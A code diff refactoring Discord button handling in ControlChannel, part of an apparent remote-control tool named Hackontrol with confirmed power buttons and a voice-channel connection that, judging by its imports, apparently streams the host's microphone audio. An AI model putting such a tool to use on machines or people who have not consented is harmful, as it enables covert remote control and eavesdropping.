@@ -9,15 +9,17 @@ import javax.sound.sampled.TargetDataLine;
 
 import com.khopan.hackontrol.Hackontrol;
 import com.khopan.hackontrol.HackontrolChannel;
-import com.khopan.hackontrol.manager.button.ButtonInteraction;
+import com.khopan.hackontrol.manager.button.ButtonContext;
 import com.khopan.hackontrol.manager.button.ButtonManager;
+import com.khopan.hackontrol.manager.button.Question;
+import com.khopan.hackontrol.manager.button.Question.OptionType;
+import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.ErrorUtils;
 
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
-import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
 import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
 import net.dv8tion.jda.api.managers.AudioManager;
 
@@ -60,61 +62,54 @@ public class ControlChannel extends HackontrolChannel {
 
 	@Override
 	public void register(Registry registry) {
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SLEEP_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.SLEEP));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SHUTDOWN_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.SHUTDOWN));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.RESTART_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.RESTART));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.CONNECT_BUTTON_IDENTIFIER, interaction -> this.connect(interaction, true));
-		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.DISCONNECT_BUTTON_IDENTIFIER, interaction -> this.connect(interaction, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SLEEP_BUTTON_IDENTIFIER, context -> this.power(context, PowerAction.SLEEP));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SHUTDOWN_BUTTON_IDENTIFIER, context -> this.power(context, PowerAction.SHUTDOWN));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.RESTART_BUTTON_IDENTIFIER, context -> this.power(context, PowerAction.RESTART));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.CONNECT_BUTTON_IDENTIFIER, context -> this.connect(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.DISCONNECT_BUTTON_IDENTIFIER, context -> this.connect(context, false));
 	}
 
-	private void power(ButtonInteraction interaction, PowerAction powerAction) {
-		interaction.yesNoQuestion("Are you sure you want to " + powerAction.text + '?', answer -> {
-			if(answer) {
-				this.powerCallback(interaction, powerAction, answer);
+	private void power(ButtonContext context, PowerAction powerAction) {
+		Question.create(context.reply(), "Are you sure you want to " + powerAction.text + '?', OptionType.YES_NO, result -> {
+			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
+				context.sendMessage(powerAction.text).queue();
 			}
 		});
 	}
 
-	private void powerCallback(ButtonInteraction interaction, PowerAction powerAction, boolean answer) {
-		interaction.getEvent().getChannel().sendMessage(powerAction.text).queue();
-	}
-
-	private void connect(ButtonInteraction interaction, boolean connect) {
-		ButtonInteractionEvent Event = interaction.getEvent();
-
+	private void connect(ButtonContext context, boolean connect) {
 		if(connect) {
-			Event.deferEdit().queue();
-			this.connectCallback(interaction, true);
+			context.acknowledge();
+			this.connectCallback(context, true);
 			return;
 		}
 
 		if(this.handler == null) {
-			Event.reply("Hackontrol is already disconnected").addActionRow(ButtonManager.selfDelete(ButtonStyle.SUCCESS, "Ok")).queue(ButtonManager :: dynamicButtonCallback);
+			context.reply("Hackontrol is already disconnected").addActionRow(ButtonManager.selfDelete(ButtonStyle.SUCCESS, "Ok")).queue(ButtonManager :: dynamicButtonCallback);
 			return;
 		}
 
-		interaction.yesNoQuestion("Are you sure you want to disconnect?", answer -> {
-			if(answer) {
-				this.connectCallback(interaction, false);
+		Question.create(context.reply(), "Are you sure you want to disconnect?", OptionType.YES_NO, result -> {
+			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
+				this.connectCallback(context, false);
 			}
 		});
 	}
 
-	private void connectCallback(ButtonInteraction interaction, boolean connect) {
+	private void connectCallback(ButtonContext context, boolean connect) {
 		try {
 			if(connect) {
-				this.connect(interaction);
+				this.connect(context);
 			} else {
-				this.disconnect(interaction);
+				this.disconnect(context);
 			}
 		} catch(Throwable Errors) {
-			ErrorUtils.sendErrorMessage(interaction.getEvent().getChannel(), Errors);
+			ErrorUtils.sendErrorMessage(context, Errors);
 		}
 	}
 
-	private void connect(ButtonInteraction interaction) throws Throwable {
-		ButtonInteractionEvent Event = interaction.getEvent();
-		Guild guild = Event.getGuild();
+	private void connect(ButtonContext context) throws Throwable {
+		Guild guild = context.getGuild();
 
 		if(this.audioManager == null) {
 			this.audioManager = guild.getAudioManager();
@@ -133,9 +128,8 @@ public class ControlChannel extends HackontrolChannel {
 		this.audioManager.openAudioConnection(channel);
 	}
 
-	private void disconnect(ButtonInteraction interaction) throws Throwable {
-		ButtonInteractionEvent Event = interaction.getEvent();
-		Guild guild = Event.getGuild();
+	private void disconnect(ButtonContext context) throws Throwable {
+		Guild guild = context.getGuild();
 
 		if(this.audioManager == null) {
 			this.audioManager = guild.getAudioManager();
